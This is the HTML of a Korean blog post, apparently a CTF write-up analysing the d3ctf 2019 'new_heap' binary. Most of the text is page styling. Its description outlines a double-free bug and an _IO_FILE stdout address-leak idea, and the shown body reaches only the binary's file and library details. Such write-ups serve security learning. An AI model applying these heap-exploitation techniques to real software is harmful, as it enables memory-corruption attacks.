var(--primary-text-color);font-size:40px;font-weight:700;margin-bottom:15px;padding-bottom:7px;text-align:center;width:-webkit-fit-content;width:-moz-fit-content;width:fit-content}.category-page-header-wrapper .category-page-subtitle{font-size:20px;font-weight:500;padding-bottom:10px;text-align:center}.post-card-wrapper{display:flex;justify-content:center;min-height:150px;width:100%}.post-card-wrapper .post-card{border:1px solid var(--post-card-border-color);border-radius:6px;color:var(--primary-text-color);cursor:pointer;display:flex;flex-direction:column;height:100%;margin-bottom:15px;max-width:720px;padding:15px;transition:transform .2s;width:100%}.post-card-wrapper .post-card:hover .title{text-decoration:underline}@media(min-width:768px){.post-card-wrapper .post-card{margin-bottom:0}}.post-card-wrapper .post-card .title{font-size:18px;font-weight:600;line-height:1.4;margin-bottom:7px}.post-card-wrapper .post-card .description{-webkit-line-clamp:3;-webkit-box-orient:vertical;color:var(--primary-text-color);display:-webkit-box;font-size:13px;line-height:20px;margin-bottom:10px;overflow:hidden;text-overflow:ellipsis}.post-card-wrapper .post-card .info{color:var(--about-link-icon-color);display:flex;font-size:14px;justify-content:space-between;margin-top:auto}.post-card-wrapper .post-card .info .categories{display:flex}.post-card-wrapper .post-card .info .categories .category{margin-left:4px}.post-card-wrapper .post-card .info .categories .category:hover{text-decoration:underline}.post-card-column-wrapper{display:flex;justify-content:center;width:100%}.post-card-column-wrapper .post-card-column{align-items:center;display:flex;flex-direction:column}.post-card-column-wrapper .post-card-column .post-card-wrapper{margin-bottom:10px}.post-card-column-wrapper .post-card-column .more-post-card-button{background-color:var(--button-background-color);font-size:15px;font-weight:500;height:40px}.post-tabs-wrapper{align-self:flex-start;display:flex;flex-direction:column;justify-content:center;top:0;width:100%}.post-tabs-wrapper .post-tabs{display:flex;height:40px;justify-content:center;margin-bottom:12px;max-width:760px;width:100%}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTab-root{color:var(--tab-text-color);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:17px;font-weight:500;height:40px;min-height:auto;min-width:auto;padding:10px 12px;transition:all .2s ease}.post-tabs-wrapper .post-tabs .mui-tabs .Mui-selected,.post-tabs-wrapper .post-tabs .mui-tabs .MuiTab-root :hover{color:var(--tab-hover-text-color);transition:all .2s ease}.post-tabs-wrapper .post-tabs .mui-tabs .Mui-selected{background-color:var(--tab-selected-background-color);border-radius:8px;font-weight:600}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTabScrollButton-root{height:40px;width:20px}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTabs-scrollable{height:40px}.post-tabs-wrapper .post-tabs .mui-tabs .MuiTabs-indicator{display:none}</style><meta name="generator" content="Gatsby 3.14.5"/><style data-emotion="css-global o6gwfi">html{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;box-sizing:border-box;-webkit-text-size-adjust:100%;}*,*::before,*::after{box-sizing:inherit;}strong,b{font-weight:700;}body{margin:0;color:rgba(0, 0, 0, 0.87);font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:400;font-size:1rem;line-height:1.5;letter-spacing:0.00938em;background-color:#fff;}@media print{body{background-color:#fff;}}body::backdrop{background-color:#fff;}</style><style data-emotion="css-global 1prfaxn">@-webkit-keyframes mui-auto-fill{from{display:block;}}@keyframes mui-auto-fill{from{display:block;}}@-webkit-keyframes mui-auto-fill-cancel{from{display:block;}}@keyframes mui-auto-fill-cancel{from{display:block;}}</style><style data-emotion="css 1l6di18 feqhe6 11tfndm mnn31 vubbuv 1yxmbwk 6flbmm">.css-1l6di18.Mui-focused .MuiAutocomplete-clearIndicator{visibility:visible;}@media (pointer: fine){.css-1l6di18:hover .MuiAutocomplete-clearIndicator{visibility:visible;}}.css-1l6di18 .MuiAutocomplete-tag{margin:3px;max-width:calc(100% - 6px);}.css-1l6di18 .MuiAutocomplete-inputRoot{-webkit-box-flex-wrap:wrap;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;}.MuiAutocomplete-hasPopupIcon.css-1l6di18 .MuiAutocomplete-inputRoot,.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiAutocomplete-inputRoot{padding-right:30px;}.MuiAutocomplete-hasPopupIcon.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiAutocomplete-inputRoot{padding-right:56px;}.css-1l6di18 .MuiAutocomplete-inputRoot .MuiAutocomplete-input{width:0;min-width:30px;}.css-1l6di18 .MuiInput-root{padding-bottom:1px;}.css-1l6di18 .MuiInput-root .MuiInput-input{padding:4px 4px 4px 0px;}.css-1l6di18 .MuiInput-root.MuiInputBase-sizeSmall .MuiInput-input{padding:2px 4px 3px 0;}.css-1l6di18 .MuiOutlinedInput-root{padding:9px;}.MuiAutocomplete-hasPopupIcon.css-1l6di18 .MuiOutlinedInput-root,.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiOutlinedInput-root{padding-right:39px;}.MuiAutocomplete-hasPopupIcon.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiOutlinedInput-root{padding-right:65px;}.css-1l6di18 .MuiOutlinedInput-root .MuiAutocomplete-input{padding:7.5px 4px 7.5px 6px;}.css-1l6di18 .MuiOutlinedInput-root .MuiAutocomplete-endAdornment{right:9px;}.css-1l6di18 .MuiOutlinedInput-root.MuiInputBase-sizeSmall{padding:6px;}.css-1l6di18 .MuiOutlinedInput-root.MuiInputBase-sizeSmall .MuiAutocomplete-input{padding:2.5px 4px 2.5px 6px;}.css-1l6di18 .MuiFilledInput-root{padding-top:19px;padding-left:8px;}.MuiAutocomplete-hasPopupIcon.css-1l6di18 .MuiFilledInput-root,.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiFilledInput-root{padding-right:39px;}.MuiAutocomplete-hasPopupIcon.MuiAutocomplete-hasClearIcon.css-1l6di18 .MuiFilledInput-root{padding-right:65px;}.css-1l6di18 .MuiFilledInput-root .MuiFilledInput-input{padding:7px 4px;}.css-1l6di18 .MuiFilledInput-root .MuiAutocomplete-endAdornment{right:9px;}.css-1l6di18 .MuiFilledInput-root.MuiInputBase-sizeSmall{padding-bottom:1px;}.css-1l6di18 .MuiFilledInput-root.MuiInputBase-sizeSmall .MuiFilledInput-input{padding:2.5px 4px;}.css-1l6di18 .MuiInputBase-hiddenLabel{padding-top:8px;}.css-1l6di18 .MuiAutocomplete-input{-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;text-overflow:ellipsis;opacity:1;}.css-feqhe6{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;position:relative;min-width:0;padding:0;margin:0;border:0;vertical-align:top;width:100%;}.css-11tfndm{font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:400;font-size:1rem;line-height:1.4375em;letter-spacing:0.00938em;color:rgba(0, 0, 0, 0.87);box-sizing:border-box;position:relative;cursor:text;display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;width:100%;position:relative;}.css-11tfndm.Mui-disabled{color:rgba(0, 0, 0, 0.38);cursor:default;}label+.css-11tfndm{margin-top:16px;}.css-11tfndm:after{border-bottom:2px solid #1976d2;left:0;bottom:0;content:"";position:absolute;right:0;-webkit-transform:scaleX(0);-moz-transform:scaleX(0);-ms-transform:scaleX(0);transform:scaleX(0);-webkit-transition:-webkit-transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;transition:transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;pointer-events:none;}.css-11tfndm.Mui-focused:after{-webkit-transform:scaleX(1);-moz-transform:scaleX(1);-ms-transform:scaleX(1);transform:scaleX(1);}.css-11tfndm.Mui-error:after{border-bottom-color:#d32f2f;-webkit-transform:scaleX(1);-moz-transform:scaleX(1);-ms-transform:scaleX(1);transform:scaleX(1);}.css-11tfndm:before{border-bottom:1px solid rgba(0, 0, 0, 0.42);left:0;bottom:0;content:"\00a0";position:absolute;right:0;-webkit-transition:border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;pointer-events:none;}.css-11tfndm:hover:not(.Mui-disabled):before{border-bottom:2px solid rgba(0, 0, 0, 0.87);}@media (hover: none){.css-11tfndm:hover:not(.Mui-disabled):before{border-bottom:1px solid rgba(0, 0, 0, 0.42);}}.css-11tfndm.Mui-disabled:before{border-bottom-style:dotted;}.css-mnn31{font:inherit;letter-spacing:inherit;color:currentColor;padding:4px 0 5px;border:0;box-sizing:content-box;background:none;height:1.4375em;margin:0;-webkit-tap-highlight-color:transparent;display:block;min-width:0;width:100%;-webkit-animation-name:mui-auto-fill-cancel;animation-name:mui-auto-fill-cancel;-webkit-animation-duration:10ms;animation-duration:10ms;}.css-mnn31::-webkit-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31::-moz-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31:-ms-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31::-ms-input-placeholder{color:currentColor;opacity:0.42;-webkit-transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-mnn31:focus{outline:0;}.css-mnn31:invalid{box-shadow:none;}.css-mnn31::-webkit-search-decoration{-webkit-appearance:none;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31::-webkit-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31::-moz-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:-ms-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31::-ms-input-placeholder{opacity:0!important;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus::-webkit-input-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus::-moz-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus:-ms-input-placeholder{opacity:0.42;}label[data-shrink=false]+.MuiInputBase-formControl .css-mnn31:focus::-ms-input-placeholder{opacity:0.42;}.css-mnn31.Mui-disabled{opacity:1;-webkit-text-fill-color:rgba(0, 0, 0, 0.38);}.css-mnn31:-webkit-autofill{-webkit-animation-duration:5000s;animation-duration:5000s;-webkit-animation-name:mui-auto-fill;animation-name:mui-auto-fill;}.css-vubbuv{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:1em;height:1em;display:inline-block;fill:currentColor;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;font-size:1.5rem;}.css-1yxmbwk{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;outline:0;border:0;margin:0;border-radius:0;padding:0;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;-moz-appearance:none;-webkit-appearance:none;-webkit-text-decoration:none;text-decoration:none;color:inherit;text-align:center;-webkit-flex:0 0 auto;-ms-flex:0 0 auto;flex:0 0 auto;font-size:1.5rem;padding:8px;border-radius:50%;overflow:visible;color:rgba(0, 0, 0, 0.54);-webkit-transition:background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;}.css-1yxmbwk::-moz-focus-inner{border-style:none;}.css-1yxmbwk.Mui-disabled{pointer-events:none;cursor:default;}@media print{.css-1yxmbwk{-webkit-print-color-adjust:exact;color-adjust:exact;}}.css-1yxmbwk:hover{background-color:rgba(0, 0, 0, 0.04);}@media (hover: none){.css-1yxmbwk:hover{background-color:transparent;}}.css-1yxmbwk.Mui-disabled{background-color:transparent;color:rgba(0, 0, 0, 0.26);}.css-6flbmm{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:1em;height:1em;display:inline-block;fill:currentColor;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;font-size:2.1875rem;}</style><link rel="preconnect" href="https://www.google-analytics.com"/><link rel="dns-prefetch" href="https://www.google-analytics.com"/><script>
+  
+  function gaOptout(){document.cookie=disableStr+'=true; expires=Thu, 31 Dec 2099 23:59:59 UTC;path=/',window[disableStr]=!0}var gaProperty='0',disableStr='ga-disable-'+gaProperty;document.cookie.indexOf(disableStr+'=true')>-1&&(window[disableStr]=!0);
+  if(true) {
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  }
+  if (typeof ga === "function") {
+    ga('create', '0', 'auto', {});
+      ga('set', 'anonymizeIp', true);
+      
+      
+      
+      
+      }</script><link rel="icon" href="/favicon-32x32.png?v=ad9e124e5060ab5ddbaf24744e1cfc72" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=ad9e124e5060ab5ddbaf24744e1cfc72"/><style type="text/css">
+    .anchor.before {
+      position: absolute;
+      top: 0;
+      left: 0;
+      transform: translateX(-100%);
+      padding-right: 4px;
+    }
+    .anchor.after {
+      display: inline-block;
+      padding-left: 4px;
+    }
+    h1 .anchor svg,
+    h2 .anchor svg,
+    h3 .anchor svg,
+    h4 .anchor svg,
+    h5 .anchor svg,
+    h6 .anchor svg {
+      visibility: hidden;
+    }
+    h1:hover .anchor svg,
+    h2:hover .anchor svg,
+    h3:hover .anchor svg,
+    h4:hover .anchor svg,
+    h5:hover .anchor svg,
+    h6:hover .anchor svg,
+    h1 .anchor:focus svg,
+    h2 .anchor:focus svg,
+    h3 .anchor:focus svg,
+    h4 .anchor:focus svg,
+    h5 .anchor:focus svg,
+    h6 .anchor:focus svg {
+      visibility: visible;
+    }
+  </style><script>
+    document.addEventListener("DOMContentLoaded", function(event) {
+      var hash = window.decodeURI(location.hash.replace('#', ''))
+      if (hash !== '') {
+        var element = document.getElementById(hash)
+        if (element) {
+          var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
+          var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
+          var offset = element.getBoundingClientRect().top + scrollTop - clientTop
+          // Wait for the browser to finish rendering before scrolling.
+          setTimeout((function() {
+            window.scrollTo(0, offset - 0)
+          }), 0)
+        }
+      }
+    })
+  </script><title data-react-helmet="true">d3ctf 2019 new_heap 취약점 분석</title><meta data-react-helmet="true" name="viewport" content="initial-scale=1, width=device-width"/><meta data-react-helmet="true" property="og:title" content="d3ctf 2019 new_heap 취약점 분석"/><meta data-react-helmet="true" property="og:site_title" content="d3ctf 2019 new_heap 취약점 분석"/><meta data-react-helmet="true" name="description" content="취약점 분석 바이너리 개요 보호 기법 main 함수 분석   함수를 바탕으로 1.alloc, 2. free, 3. exit 조건을 수행하는 것을 확인할 수 있다. alloc  메모리 동적할당 과정을 확인해 보면 전역 포인터 배열  에 할당하는 것을 확인할 수 있으며 인덱스 범위가 총19개까지 할당이 가능하다. 사용자의 입력값이  이하까지 size로 할당이 되어지며 해당 사이즈 만큼 데이터를 입력 할 수 있다. free  free되는 과정을 확인해 보면 사용자의 입력 값이 곧 인덱스 범위로 사용되어 원하는 힙을 해제할 수 있으며 기본적인 길이 검증이 존재한다. 하지만 해제한 초인터를 초기화하지 않기 때문에 Double Free Bug가 발생한다. memory leak Idea 어떻게 하면 메모리 주소값을 릭할 수 있을 까? 힙 청크의 데이터를 출력하는 기능이 존재하지 않아 다른 방법을 찾아야 한다. _IO_FILE_stdout  파일 디스크립터는 출력할 때 주로 사용하며 구조체로 수…"/><meta data-react-helmet="true" property="og:description" content="취약점 분석 바이너리 개요 보호 기법 main 함수 분석   함수를 바탕으로 1.alloc, 2. free, 3. exit 조건을 수행하는 것을 확인할 수 있다. alloc  메모리 동적할당 과정을 확인해 보면 전역 포인터 배열  에 할당하는 것을 확인할 수 있으며 인덱스 범위가 총19개까지 할당이 가능하다. 사용자의 입력값이  이하까지 size로 할당이 되어지며 해당 사이즈 만큼 데이터를 입력 할 수 있다. free  free되는 과정을 확인해 보면 사용자의 입력 값이 곧 인덱스 범위로 사용되어 원하는 힙을 해제할 수 있으며 기본적인 길이 검증이 존재한다. 하지만 해제한 초인터를 초기화하지 않기 때문에 Double Free Bug가 발생한다. memory leak Idea 어떻게 하면 메모리 주소값을 릭할 수 있을 까? 힙 청크의 데이터를 출력하는 기능이 존재하지 않아 다른 방법을 찾아야 한다. _IO_FILE_stdout  파일 디스크립터는 출력할 때 주로 사용하며 구조체로 수…"/><meta data-react-helmet="true" property="og:author" content="Zer0Luck"/><meta data-react-helmet="true" property="og:image" content="/og-image.png"/><meta data-react-helmet="true" property="og:type" content="website"/><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="/static/webfonts/s/roboto/v29/KFOlCnqEu92Fr1MmSU5fBBc4.woff2"/><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="/static/webfonts/s/roboto/v29/KFOmCnqEu92Fr1Mu4mxK.woff2"/><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="/static/webfonts/s/roboto/v29/KFOlCnqEu92Fr1MmEU9fBBc4.woff2"/><style>@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:300;src:url(/static/webfonts/s/roboto/v29/KFOlCnqEu92Fr1MmSU5fBBc4.woff2) format("woff2")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:400;src:url(/static/webfonts/s/roboto/v29/KFOmCnqEu92Fr1Mu4mxK.woff2) format("woff2")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:500;src:url(/static/webfonts/s/roboto/v29/KFOlCnqEu92Fr1MmEU9fBBc4.woff2) format("woff2")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:300;src:url(/static/webfonts/s/roboto/v29/KFOlCnqEu92Fr1MmSU5fBBc-.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:400;src:url(/static/webfonts/s/roboto/v29/KFOmCnqEu92Fr1Mu4mxM.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto;font-style:normal;font-weight:500;src:url(/static/webfonts/s/roboto/v29/KFOlCnqEu92Fr1MmEU9fBBc-.woff) format("woff")}</style><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="alternate" type="application/rss+xml" href="/rss.xml"/><style>.gatsby-image-wrapper{position:relative;overflow:hidden}.gatsby-image-wrapper picture.object-fit-polyfill{position:static!important}.gatsby-image-wrapper img{bottom:0;height:100%;left:0;margin:0;max-width:none;padding:0;position:absolute;right:0;top:0;width:100%;object-fit:cover}.gatsby-image-wrapper [data-main-image]{opacity:0;transform:translateZ(0);transition:opacity .25s linear;will-change:opacity}.gatsby-image-wrapper-constrained{display:inline-block;vertical-align:top}</style><noscript><style>.gatsby-image-wrapper noscript [data-main-image]{opacity:1!important}.gatsby-image-wrapper [data-placeholder-image]{opacity:0!important}</style></noscript><script type="module">const e="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;e&&document.body.addEventListener("load",(function(e){if(void 0===e.target.dataset.mainImage)return;if(void 0===e.target.dataset.gatsbyImageSsr)return;const t=e.target;let a=null,n=t;for(;null===a&&n;)void 0!==n.parentNode.dataset.gatsbyImageWrapper&&(a=n.parentNode),n=n.parentNode;const o=a.querySelector("[data-placeholder-image]"),r=new Image;r.src=t.currentSrc,r.decode().catch((()=>{})).then((()=>{t.style.opacity=1,o&&(o.style.opacity=0,o.style.transition="opacity 500ms linear")}))}),!0);</script><link as="script" rel="preload" href="/webpack-runtime-7540f1a080c56993ae69.js"/><link as="script" rel="preload" href="/framework-373e01a4682a5f0c98a3.js"/><link as="script" rel="preload" href="/app-7556968f1157cba98cd0.js"/><link as="script" rel="preload" href="/f9d3028dbef90a6e9b8db85387d63dd9f4edf538-f8cf487d5388e1dc0b4b.js"/><link as="script" rel="preload" href="/component---src-templates-blog-template-js-c8576cef7b6a608fcd4a.js"/><link as="fetch" rel="preload" href="/page-data/d3ctf2019_new_heap_ctf_writeup/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/1073350324.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/1956554647.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/2938748437.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="page-wrapper"><header class="page-header-wrapper"><div class="page-header"><div class="front-section"><a class="link" href="/">Zer0Luck</a></div><div class="trailing-section"><a class="link" href="/about">about</a><a class="link" href="/posts">posts</a><div class="MuiAutocomplete-root MuiAutocomplete-hasPopupIcon css-1l6di18" role="combobox" aria-expanded="false"><div class="search-input-wrapper"><div class="MuiFormControl-root MuiFormControl-fullWidth MuiTextField-root search-input css-feqhe6"><div class="MuiInput-root MuiInput-underline MuiInputBase-root MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-formControl MuiInputBase-adornedEnd MuiAutocomplete-inputRoot css-11tfndm"><input type="text" aria-invalid="false" autoComplete="off" value="" class="MuiInput-input MuiInputBase-input MuiInputBase-inputAdornedEnd MuiAutocomplete-input MuiAutocomplete-inputFocused css-mnn31" aria-autocomplete="list" autoCapitalize="none" spellcheck="false"/><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium search-icon css-vubbuv" focusable="false" viewBox="0 0 24 24" aria-hidden="true" data-testid="SearchOutlinedIcon"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg></div></div></div></div></div></div></header><main class="page-content"><header class="post-header"><div class="emoji">🍣</div><div class="info"><div class="categories"><a class="category" href="/posts/CTF">CTF</a></div></div><h1 class="title">d3ctf 2019 new_heap 취약점 분석</h1><div class="info"><div class="author">posted by <strong>Zer0Luck</strong>,</div> <!-- -->September 18, 2020</div></header><div class="post-content"><div class="markdown"><h1 id="취약점-분석" style="position:relative;"><a href="#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D" aria-label="취약점 분석 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>취약점 분석</h1>
+<h2 id="바이너리-개요" style="position:relative;"><a href="#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94" aria-label="바이너리 개요 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>바이너리 개요</h2>
+<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">new_heap<span class="token punctuation">:</span> ELF <span class="token number">64</span><span class="token operator">-</span>bit LSB shared <span class="token builtin">object</span>
+x86<span class="token operator">-</span><span class="token number">64</span> version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>
+dynamically linked
+interpreter <span class="token operator">/</span>lib64<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token operator">-</span>x86<span class="token operator">-</span><span class="token number">64.</span>so<span class="token punctuation">.</span><span class="token number">2</span>
+<span class="token keyword">for</span> GNU<span class="token operator">/</span>Linux <span class="token number">2.6</span><span class="token number">.32</span>
+BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>d8a6eae195909da34581c15b13d84d41ebeeab2e
+stripped
+
+linux<span class="token operator">-</span>vdso<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token number">1</span> <span class="token punctuation">(</span><span class="token number">0x00007ffff7ffb000</span><span class="token punctuation">)</span>
+libc<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token number">6</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token number">6</span> <span class="token punctuation">(</span><span class="token number">0x00007ffff77e1000</span><span class="token punctuation">)</span>
+					   <span class="token operator">/</span>lib64<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token operator">-</span>x86<span class="token operator">-</span><span class="token number">64.</span>so<span class="token punctuation">.</span><span class="token number">2</span> <span class="token punctuation">(</span><span class="token number">0x00007ffff7dd5000</span><span class="token punctuation">)</span></code></pre></div>
+<h2 id="보호-기법" style="position:relative;"><a href="#%EB%B3%B4%ED%98%B8-%EA%B8%B0%EB%B2%95" aria-label="보호 기법 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>보호 기법</h2>
+<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/Zer0Luck/challenges/new_heap/new_heap'</span>
+    Arch<span class="token punctuation">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
